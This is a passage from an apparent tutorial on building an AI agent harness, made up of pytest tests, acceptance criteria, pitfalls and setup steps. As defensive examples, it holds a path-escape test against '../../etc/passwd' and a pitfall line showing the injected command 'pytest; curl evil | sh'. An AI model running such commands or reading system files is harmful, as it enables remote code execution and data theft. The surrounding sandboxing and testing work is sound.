from harness.tools import Tool, ToolRegistry, default_registry


def test_two_step_task_finishes_done(make_harness):
    harness, model = make_harness(
        turn(call("list_dir", path="src")),
        turn(call("read_file", path="src/app.py")),
        turn(text="app.py prints hi."),
    )
    result = harness.run("What does the app print?")
    assert result.stop_reason == "done"
    assert result.final_text == "app.py prints hi."
    assert result.turns == 3
    assert result.total_tokens == 45
    assert results_in(model.requests[1])[0]["content"] == "app.py"
    assert results_in(model.requests[2])[0]["content"] == "print('hi')\n"
    assert len(result.transcript) == 6  # task + 3 assistant + 2 result messages


def test_path_escapes_come_back_as_errors(make_harness, ws, tmp_path_factory):
    outside = tmp_path_factory.mktemp("outside")
    (outside / "secret.txt").write_text("top secret")
    os.symlink(outside / "secret.txt", ws.root / "src" / "leak.txt")
    harness, model = make_harness(
        turn(
            call("read_file", path="../../etc/passwd"),
            call("read_file", path=str(outside / "secret.txt")),
            call("read_file", path="src/leak.txt"),
        ),
        turn(text="ok"),
    )
    assert harness.run("try to escape").stop_reason == "done"
    blocks = results_in(model.requests[1])
    assert [b["is_error"] for b in blocks] == [True, True, True]
    assert all("escapes the workspace" in b["content"] for b in blocks)
    assert not any("top secret" in b["content"] for b in blocks)


def test_exception_and_bad_input_become_errors_and_loop_continues(make_harness):
    def explode(ws, args):
        raise RuntimeError("disk on fire")

    boom = Tool("boom", "always fails", {"type": "object", "properties": {}}, explode)
    harness, model = make_harness(
        turn(call("boom")),
        turn(call("read_file", pathh="src/app.py")),
        turn(call("read_file", path="src/app.py")),
        turn(text="done"),
        registry=default_registry().register(boom),
        approver=lambda c, r: True,
    )
    result = harness.run("go")
    assert result.stop_reason == "done" and result.turns == 4
    first, second, third = (results_in(model.requests[i])[0] for i in (1, 2, 3))
    assert first["is_error"] and first["content"] == "RuntimeError: disk on fire"
    assert second["is_error"] and "missing required field 'path'" in second["content"]
    assert "unexpected field 'pathh'" in second["content"]
    assert not third["is_error"]


def test_unknown_tool_is_an_error(make_harness):
    harness, model = make_harness(turn(call("delete_everything")), turn(text="ok"))
    harness.run("go")
    assert results_in(model.requests[1])[0]["content"] == "unknown tool 'delete_everything'"


def test_deny_tells_the_model_why(make_harness, ws):
    class DenyWrites:
        def decide(self, c):
            return PermissionDecision("deny", "read-only session")

    harness, model = make_harness(
        turn(call("write_file", path="src/x.py", content="x")), turn(text="ok"), policy=DenyWrites()
    )
    harness.run("write")
    block = results_in(model.requests[1])[0]
    assert block["is_error"] and block["content"] == "permission denied: read-only session"
    assert not (ws.root / "src" / "x.py").exists()


def test_ask_calls_the_approver(make_harness, ws):
    asked = []

    def approver(c, reason):
        asked.append((c.name, c.input["path"], reason))
        return c.input["path"] == "notes.md"

    harness, model = make_harness(
        turn(
            call("write_file", path="notes.md", content="a"),
            call("write_file", path="docs/x.md", content="b"),
        ),
        turn(text="ok"),
        approver=approver,
    )
    harness.run("write two files")
    assert [a[1] for a in asked] == ["notes.md", "docs/x.md"]
    ok, declined = results_in(model.requests[1])
    assert not ok["is_error"] and (ws.root / "notes.md").exists()
    assert declined["is_error"] and declined["content"].startswith(
        "permission denied: the user declined"
    )


def test_ask_without_approver_is_denied(make_harness):
    harness, model = make_harness(
        turn(call("write_file", path="notes.md", content="a")), turn(text="ok")
    )
    harness.run("go")
    assert "no approver is configured" in results_in(model.requests[1])[0]["content"]


def test_rule_policy_allows_src_writes_and_resolves_dotdot(make_harness, ws):
    harness, model = make_harness(
        turn(
            call("write_file", path="src/new.py", content="x = 1\n"),
            call("write_file", path="src/../top.txt", content="x"),
        ),
        turn(text="ok"),
    )
    harness.run("go")
    allowed, asked = results_in(model.requests[1])
    assert not allowed["is_error"]
    assert "write to top.txt is outside" in asked["content"]


def test_pre_tool_hook_blocks_with_reason(make_harness, ws):
    harness, model = make_harness(
        turn(call("write_file", path="src/.env", content="KEY=1")),
        turn(text="ok"),
        pre_tool=(block_protected_writes,),
    )
    harness.run("go")
    block = results_in(model.requests[1])[0]
    assert (
        block["is_error"]
        and block["content"] == "blocked by hook: .env is a protected file; edit it by hand"
    )
    assert not (ws.root / "src" / ".env").exists()


def test_crashing_pre_tool_hook_fails_closed(make_harness):
    def broken(c):
        raise KeyError("oops")

    harness, model = make_harness(
        turn(call("list_dir", path=".")), turn(text="ok"), pre_tool=(broken,)
    )
    harness.run("go")
    assert "crashed" in results_in(model.requests[1])[0]["content"]


def test_post_tool_hook_appends_note(make_harness):
    harness, model = make_harness(
        turn(call("write_file", path="src/bad.py", content="def f(:\n")),
        turn(text="ok"),
        post_tool=(python_syntax_note,),
    )
    harness.run("go")
    block = results_in(model.requests[1])[0]
    assert block["content"].startswith("wrote 8 chars to src/bad.py")
    assert "[note] syntax error in src/bad.py line 1" in block["content"]


def test_stop_max_turns(make_harness):
    turns = [turn(call("list_dir", path=p)) for p in (".", "src", ".")]
    harness, _ = make_harness(*turns, max_turns=2)
    result = harness.run("go")
    assert result.stop_reason == "max_turns" and result.turns == 2


def test_stop_budget(make_harness):
    harness, model = make_harness(
        turn(call("list_dir", path="."), tokens=(800, 300)),
        turn(call("list_dir", path="src")),
        token_budget=1_000,
    )
    result = harness.run("go")
    assert result.stop_reason == "budget"
    assert result.total_tokens == 1_100 and len(model.requests) == 1


def test_stop_loop_detected(make_harness):
    same = [turn(call("read_file", path="src/app.py")) for _ in range(5)]
    harness, model = make_harness(*same)
    result = harness.run("go")
    assert result.stop_reason == "loop_detected"
    assert result.turns == 3 and len(model.requests) == 3


def test_different_inputs_do_not_trip_loop_detection(make_harness):
    turns = [
        turn(call("read_file", path=p))
        for p in ("src/app.py", "README.md", "src/app.py", "README.md")
    ]
    harness, _ = make_harness(*turns, turn(text="ok"))
    assert harness.run("go").stop_reason == "done"


def test_registry_rejects_duplicate_names():
    reg = ToolRegistry()
    tool = Tool("t", "d", {"type": "object"}, lambda ws, a: "")
    try:
        reg.register(tool).register(tool)
    except ValueError as exc:
        assert "already registered" in str(exc)
    else:
        raise AssertionError("duplicate tool was accepted")
```

### `tests/test_models.py`

```python
"""AnthropicModel mapping, tested offline with a fake SDK client."""

from __future__ import annotations

from types import SimpleNamespace as NS

import pytest

from harness.models import DEFAULT_MODEL, AnthropicModel, ScriptedModel, ScriptExhausted


class FakeMessages:
    def __init__(self, response):
        self.response = response
        self.kwargs = None

    def create(self, **kwargs):
        self.kwargs = kwargs
        return self.response


def test_maps_text_tool_use_stop_reason_and_usage():
    response = NS(
        content=[
            NS(type="text", text="Let me look."),
            NS(type="tool_use", id="toolu_1", name="list_dir", input={"path": "."}),
        ],
        stop_reason="tool_use",
        usage=NS(input_tokens=120, output_tokens=30),
    )
    messages = FakeMessages(response)
    model = AnthropicModel(model="m-test", client=NS(messages=messages))
    turn = model.complete("sys", [{"role": "user", "content": "hi"}], [{"name": "list_dir"}])
    assert turn.text == "Let me look."
    assert turn.tool_calls[0].id == "toolu_1" and turn.tool_calls[0].input == {"path": "."}
    assert (turn.stop_reason, turn.input_tokens, turn.output_tokens) == ("tool_use", 120, 30)
    assert messages.kwargs["model"] == "m-test" and messages.kwargs["system"] == "sys"
    assert messages.kwargs["tools"] == [{"name": "list_dir"}]


def test_omits_empty_tools():
    response = NS(
        content=[NS(type="text", text="ok")],
        stop_reason="end_turn",
        usage=NS(input_tokens=1, output_tokens=1),
    )
    messages = FakeMessages(response)
    AnthropicModel(client=NS(messages=messages)).complete("s", [], [])
    assert "tools" not in messages.kwargs


def test_model_id_from_env(monkeypatch):
    monkeypatch.delenv("HARNESS_MODEL", raising=False)
    assert AnthropicModel().model == DEFAULT_MODEL
    monkeypatch.setenv("HARNESS_MODEL", "claude-other")
    assert AnthropicModel().model == "claude-other"


def test_missing_key_is_a_clear_error(monkeypatch):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    with pytest.raises(RuntimeError, match="ANTHROPIC_API_KEY"):
        AnthropicModel().complete("s", [], [])


def test_scripted_model_raises_when_exhausted():
    with pytest.raises(ScriptExhausted):
        ScriptedModel([]).complete("s", [], [])
```

## Meeting the acceptance criteria

- **A scripted two-step task finishes with `stop_reason == "done"`.**
  `test_two_step_task_finishes_done` scripts `list_dir`, then `read_file`, then
  a final text turn. It checks the stop reason, turn count, token total, and
  that each tool result reached the model in the next request.
- **Path escapes are rejected as tool errors, not executed.**
  `Workspace.resolve` resolves symlinks and then checks `is_relative_to`.
  `test_path_escapes_come_back_as_errors` sends `../../etc/passwd`, an absolute
  path outside the workspace, and a symlink that points out. All three come
  back as `is_error` results and the secret file's content never appears.
  `test_symlink_pointing_out_is_rejected` also covers writes through a linked
  directory.
- **A tool exception and a schema-invalid input come back as errors and the
  loop continues.** `_invoke` catches every exception from a tool. `validate`
  runs before the tool function. `test_exception_and_bad_input_become_errors_and_loop_continues`
  shows a `RuntimeError`, then a misspelled field, then a good call, then
  `done`.
- **`deny` and a blocking `pre_tool` hook stop the call and say why; `ask`
  calls the approver.** `test_deny_tells_the_model_why`,
  `test_pre_tool_hook_blocks_with_reason`, `test_ask_calls_the_approver` (one
  approved, one declined), and `test_ask_without_approver_is_denied`. In each
  case the file system is checked to confirm nothing was written.
- **Each stop condition triggers.** `test_stop_max_turns`, `test_stop_budget`
  (stops before the second model call once 1,100 tokens exceed a 1,000
  budget), and `test_stop_loop_detected` (stops after the third identical
  call). `test_different_inputs_do_not_trip_loop_detection` guards against a
  detector that keys on the tool name alone.
- **One live run against a real model.** Use `python -m harness.cli` (see
  Verification). The CLI uses the same `Harness` with `AnthropicModel`, the
  rule-based policy, a terminal approver, the protected-path guard, and the
  syntax-check note. `test_models.py` checks the Messages API mapping
  (`tool_use` blocks, `stop_reason`, `usage.input_tokens` and
  `usage.output_tokens`) offline with a fake client.

## Common pitfalls

- **Checking the path before resolving it.** `"src/../../etc"` and a symlink
  both pass a check on the raw string. Resolve first, then compare with
  `is_relative_to`, never with `str.startswith`.
- **Dropping the result of a blocked call.** Every `tool_use` needs a
  `tool_result` in the next message, including denials and hook blocks.
  Otherwise the next API request fails and the "safe" path crashes the run.
- **Letting tool exceptions escape.** One bad file read should not end a
  50-turn run. Catch around the tool call only. Don't wrap `model.complete`
  in the same handler; an API failure is a real error and should surface.
- **`shell=True` or `sh -c`.** Either turns `pytest; curl evil | sh` into two
  commands. Split with `shlex`, run an argument vector, and keep shells off
  the allowlist.
- **Keeping only the head of long output.** Test runners and compilers print
  the failure last. Keep both ends and say how much was cut.
- **Prefix-matching raw paths in the policy.** `src/../config.py` starts with
  `src/` but lands outside it. The policy resolves the path through the same
  `Workspace` the tools use.
- **Treating `True` as an integer.** In Python `bool` is a subclass of `int`.
  A naive `isinstance(x, int)` check lets `{"count": true}` through.
- **Loop detection on the tool name only.** Reading three different files in
  a row is normal. Compare the name and the canonical (sorted-key) input.
- **Checking the budget after the run.** Check before each model call, so the
  run stops before it spends more, not after.

## Verification

Create the files above in a fresh directory, then:

```bash
cd exercise-01-build-a-minimal-harness
python3.11 -m venv .venv && . .venv/bin/activate
pip install pytest

# Offline: every test uses ScriptedModel or a fake SDK client.
pytest -q

# Live run in a scratch workspace. Set a spend cap on the key first.
pip install anthropic
export ANTHROPIC_API_KEY=...            # never commit this
export HARNESS_MODEL=claude-sonnet-4-5  # check the current models list
mkdir -p /tmp/scratch-ws/src
printf 'def add(a, b):\n    return a - b\n' > /tmp/scratch-ws/src/calc.py
python -m harness.cli --workspace /tmp/scratch-ws --budget 50000 \
  "add() in src/calc.py is wrong. Fix it, add tests/test_calc.py, and run pytest."
```

Expected: `pytest -q` reports `32 passed`. The live run lists and reads
`src/calc.py`, writes the fix and the test without prompting (both are under
`src/` or `tests/`), runs `pytest` (auto-allowed), and ends with
`stop=done`. If the model tries `python` directly, the CLI asks you first.
